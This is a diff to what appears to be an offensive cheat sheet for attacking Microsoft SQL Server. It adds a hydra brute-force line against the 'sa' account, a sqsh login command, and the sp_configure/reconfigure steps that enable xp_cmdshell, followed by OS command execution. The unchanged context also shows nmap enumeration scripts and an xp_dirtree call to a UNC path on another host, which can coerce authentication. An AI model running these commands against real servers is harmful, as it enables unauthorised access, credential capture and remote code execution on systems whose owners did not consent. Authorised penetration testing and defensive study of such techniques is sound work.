@@ -4,10 +4,14 @@ nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config
 
 # Brute force
 hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
+hydra -l sa -P password.txt -V $ip mssql
 
 # Having credentials
 mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
 mssqlclient.py <USER>:<PASSWORD>@<IP>
+
+# Connect to MSSQL server
+sqsh -S server_address -U sa -P password
 
 # Once logged in you can run queries:
 SQL> select @@ version;
@@ -20,6 +24,15 @@ SQL> exec master..xp_dirtree '\\<IP>\<HOME>\'
 
 # Try to enable code execution
 SQL> enable_xp_cmdshell
+# OR
+
+SQL> exec sp_configure 'show advanced options', 1
+
+SQL> reconfigure
+
+SQL> exec sp_configure 'xp_cmdshell', 1
+
+SQL> reconfigure
 
 # Execute code
 SQL> xp_cmdshell whoami /all
